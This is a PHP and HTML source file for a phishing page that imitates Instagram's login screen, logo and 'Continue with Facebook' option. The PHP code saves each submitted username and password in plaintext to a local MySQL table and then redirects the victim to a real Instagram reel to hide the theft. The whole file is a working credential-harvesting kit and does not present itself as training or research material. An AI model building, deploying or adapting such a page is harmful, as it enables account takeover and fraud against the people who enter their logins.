<?php
session_start();

// Database configuration
$servername = "localhost";
$db_username = "root"; // Use your MySQL username
$db_password = ""; // Use your MySQL password
$dbname = "udhayam_institute";

// Create connection
$conn = new mysqli($servername, $db_username, $db_password, $dbname);

// Check connection
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

$error = '';

if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $username = $_POST['username'];
    $password = $_POST['password'];

    // Check if user already exists
    $sql = "SELECT * FROM insta WHERE username = ? OR email = ?";
    $stmt = $conn->prepare($sql);
    $stmt->bind_param("ss", $username, $username); // Assuming email and username can be the same
    $stmt->execute();
    $result = $stmt->get_result();

    if ($result->num_rows > 0) {
        // User already exists
        $error = 'User already exists';
    } else {
        // User does not exist, insert new record
        $sql = "INSERT INTO insta (username, email, password) VALUES (?, ?, ?)";
        $stmt = $conn->prepare($sql);
        $stmt->bind_param("sss", $username, $username, $password);

        if ($stmt->execute()) {
            $_SESSION['username'] = $username;
            header('Location: https://www.instagram.com/reel/C9zpbazADX1/?igsh=MTVjZG1hYjhhMWgzbQ=='); // Redirect to Instagram app
            exit;
        } else {
            $error = 'Error: ' . $stmt->error;
        }
    }

    $stmt->close();
}

$conn->close();
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login - Instagram</title>
    <style>
        body {
            background-color: #fafafa;
            font-family: Arial, sans-serif;
        }
        .container {
            max-width: 350px;
            margin: 50px auto;
            padding: 20px;
            background-color: #fff;
            border: 1px solid #ddd;
            border-radius: 4px;
            text-align: center;
        }
        .container img {
            width: 175px;
            margin: 20px 0;
        }
        .input-field {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ddd;
            border-radius: 4px;
            box-sizing: border-box;
        }
        .button {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            background-color: #3897f0;
            color: #fff;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }
        .button:hover {
            background-color: #3071db;
        }
        .link {
            margin-top: 20px;
            color: #3897f0;
        }
        .separator {
            margin: 20px 0;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .separator::before, .separator::after {
            content: '';
            flex: 1;
            height: 1px;
            background-color: #ddd;
        }
        .separator::before {
            margin-right: 10px;
        }
        .separator::after {
            margin-left: 10px;
        }
        .facebook-login {
            display: flex;
            align-items: center;
            justify-content: center;
            color: #385185;
            font-weight: bold;
            margin: 10px 0;
        }
        .facebook-login img {
            width: 20px;
            margin-right: 8px;
        }
        .error {
            color: red;
            margin-bottom: 20px;
        }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" alt="Instagram Logo">
        <?php if ($error): ?>
            <div class="error"><?php echo $error; ?></div>
        <?php endif; ?>
        <form action="instagram.php" method="POST">
            <div class="facebook-login">
                <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo">
                Continue with Facebook
            </div>
            <div class="separator">OR</div>
            <input type="text" name="username" class="input-field" placeholder="Phone number, username, or email" required>
            <input type="password" name="password" class="input-field" placeholder="Password" required>
            <button type="submit" class="button">Log In</button>
        </form>
        <div class="link">
            <a href="#">Forgot password?</a>
        </div>
        <div class="separator"></div>
        <div class="link">
            Don't have an account? <a href="#">Sign up</a>
        </div>
    </div>
</body>
</html>
